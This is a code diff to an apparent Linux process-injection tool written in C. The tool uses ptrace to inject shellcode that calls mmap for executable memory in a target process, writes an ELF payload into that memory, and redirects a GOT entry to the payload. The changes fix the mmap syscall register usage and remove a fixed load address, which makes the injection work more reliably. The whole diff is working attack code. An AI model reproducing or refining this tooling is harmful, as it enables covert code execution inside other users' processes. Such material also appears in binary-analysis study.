@@ -16,7 +16,6 @@
 #include <sys/errno.h>
 
 #define WORD_ALIGN(x) (x + 7)&(~7)
-#define BASE_ADDRESS 0x100000
 
 typedef struct handle
 {
@@ -39,7 +38,7 @@ typedef struct handle
 static inline volatile long
 print_string(int, char *, unsigned long)__attribute__((aligned(8), __always_inline__));
 static inline volatile void *
-evil_mmap(void *, size_t, int, int, int64_t, uint64_t)__attribute__((aligned(8), __always_inline__));
+evil_mmap(void *, size_t, int, long, int64_t, uint64_t)__attribute__((aligned(8), __always_inline__));
 uint64_t injected_code() __attribute__((aligned(8)));
 int pid_read(pid_t, const void *, const void *, size_t);
 int pid_write(pid_t, const void *, const void *, size_t);
@@ -68,14 +67,14 @@ print_string(int fd, char *buf, unsigned long len)
 }
 
 static inline volatile void * 
-evil_mmap(void *addr, size_t length, int prot, int flags, int64_t fd, uint64_t offset)
+evil_mmap(void *addr, size_t length, int prot, long flags, int64_t fd, uint64_t offset)
 {
     void *ret;
     __asm__ volatile(
         "mov %1, %%rdi\n"
         "mov %2, %%rsi\n"
         "mov %3, %%edx\n"
-        "mov %4, %%ecx\n"
+        "mov %4, %%r10\n"
         "mov %5, %%r8\n"
         "mov %6, %%r9\n"
         "mov $9, %%rax\n"
@@ -91,7 +90,7 @@ uint64_t injected_code()
 {
     evil_mmap(NULL, 0x4000, 
     PROT_READ|PROT_WRITE|PROT_EXEC, 
-    MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, 
+    MAP_ANONYMOUS|MAP_PRIVATE, 
     -1, 0);
     __asm__ volatile("int3");
     
@@ -248,7 +247,7 @@ void got_redirection(handle_t h)
         }
     }
     printf("GOT redirection address: %lx\n", got_addr);
-    if(pid_write(h.pid, (void *)got_addr, &h.base_addr, sizeof(uint64_t)) < 0)
+    if(pid_write(h.pid, (void *)got_addr, (void *)&h.payload_entry, sizeof(uint64_t)) < 0)
     {
         perror("ptrace");
         exit(-1);
@@ -319,7 +318,7 @@ int main(int argc, char *argv[])
         fprintf(stderr, "Failed to restart the target process %d: %s\n", h.pid, strerror(errno));
         exit(EXIT_FAILURE);
     }
-
+    uint64_t ret_addr;
     wait(&status);
     if(WSTOPSIG(status) != SIGTRAP)
     {
@@ -333,12 +332,15 @@ int main(int argc, char *argv[])
             perror("PTRACE_GETREGS");
             exit(EXIT_FAILURE);
         }
-        printf("return value of shellcode: 0x%llx\n", h.pt_reg.rax);
-        if(h.pt_reg.rax != BASE_ADDRESS)
+        ret_addr = h.pt_reg.rax;
+        if(ret_addr < 0)
         {
-            perror("mmap");
-            exit(-1);
+            printf("mmap failed, process exit.\n");
+            exit(EXIT_FAILURE);
         }
+        printf("return value of shellcode: 0x%lx\n", ret_addr);
+        printf("Press any key to continue...\n");
+        getchar();
     }
     
     int fd;
@@ -355,9 +357,9 @@ int main(int argc, char *argv[])
     }
     uint8_t *mem = mmap(NULL, WORD_ALIGN(st.st_size), PROT_READ, MAP_PRIVATE, fd, 0);
     Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
-    h.payload_entry = h.pt_reg.rax + ehdr->e_entry;
+    h.payload_entry = ret_addr + ehdr->e_entry;
 
-    if(pid_write(h.pid, (void *)BASE_ADDRESS, mem, WORD_ALIGN(st.st_size)) < 0)
+    if(pid_write(h.pid, (void *)ret_addr, mem, WORD_ALIGN(st.st_size)) < 0)
     {
         printf("Failed to load the payload.\n");
         exit(-1);
